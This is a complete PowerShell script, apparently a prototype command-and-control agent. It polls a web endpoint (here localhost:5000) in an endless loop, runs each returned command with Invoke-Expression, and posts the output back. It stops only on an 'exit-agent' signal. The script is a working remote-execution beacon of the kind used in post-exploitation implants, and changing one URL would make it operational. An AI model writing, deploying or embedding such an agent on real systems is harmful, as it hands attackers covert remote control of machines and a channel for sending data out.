$ProgressPreference = 'SilentlyContinue'
$sleep = 2
$post = ''
while ($true)
{
    Start-Sleep -Seconds $sleep
    $cmd = Invoke-WebRequest 'http://localhost:5000/test'
    if ($cmd.Content -eq 'exit-agent') { break }
    if ($cmd.Content -eq '') { continue }

    $result = Invoke-Expression $cmd
    
    if ($result -is [string]) { $post = $result }
    elseif ($result -is [array])
    {
        foreach ($line in $result)
        {
            $post += $line.ToString() + "%NL%"
        }
    }

    Invoke-RestMethod -Uri http://localhost:5000/test -Method POST -Body $post -ContentType 'text/plain; charset=utf-8'
    $post = ''
}